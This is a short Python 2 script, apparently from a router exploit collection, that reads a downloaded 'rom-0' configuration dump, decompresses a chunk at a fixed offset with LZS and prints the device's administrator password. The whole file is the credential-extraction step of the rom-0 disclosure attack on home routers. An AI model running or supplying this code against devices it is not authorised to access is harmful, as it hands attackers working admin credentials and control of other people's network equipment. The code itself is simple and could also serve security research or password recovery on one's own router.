#!/usr/bin/python
# -*- coding: utf-8 -*-

#
# https://github.com/MrNasro/scripts/blob/master/exploits/rom0x/rom0x.sh
#


import os
from lib.lzs import LZSDecompress

fname = 'rom-0asdasd'
# fname = 'rom-0'
with open(os.path.join('tmp', fname), 'rb') as fd:
    fd.seek(8568)
    chunk = fd.read(220)
    data = LZSDecompress(chunk)[0]
    print 'Password: %s'% data[20:].split('\x00')[0]
